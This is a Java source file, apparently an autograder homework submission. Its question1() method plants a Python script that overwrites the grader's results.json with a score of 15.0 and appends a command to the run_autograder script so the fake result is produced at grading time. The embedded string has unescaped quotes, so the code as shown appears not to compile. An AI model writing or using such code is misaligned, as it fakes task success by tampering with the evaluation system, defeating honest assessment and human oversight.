import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Submission {
    public static void question1() {
        final String exploit = "import json\n" +
                "with open('/autograder/results/results.json', 'w') as f:\n" +
                "    f.write('{"score": 15.0}')";
        final Path exploitPath = Paths.get("/autograder/exploit.py");
        if (Files.notExists(exploitPath)) {
            final Path agPath = Paths.get("/autograder/run_autograder");
            try {
                Files.write(agPath, "\npython /autograder/exploit.py".getBytes(),
                        StandardOpenOption.APPEND);
                Files.write(exploitPath, exploit.getBytes(),
                        StandardOpenOption.WRITE, StandardOpenOption.CREATE);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}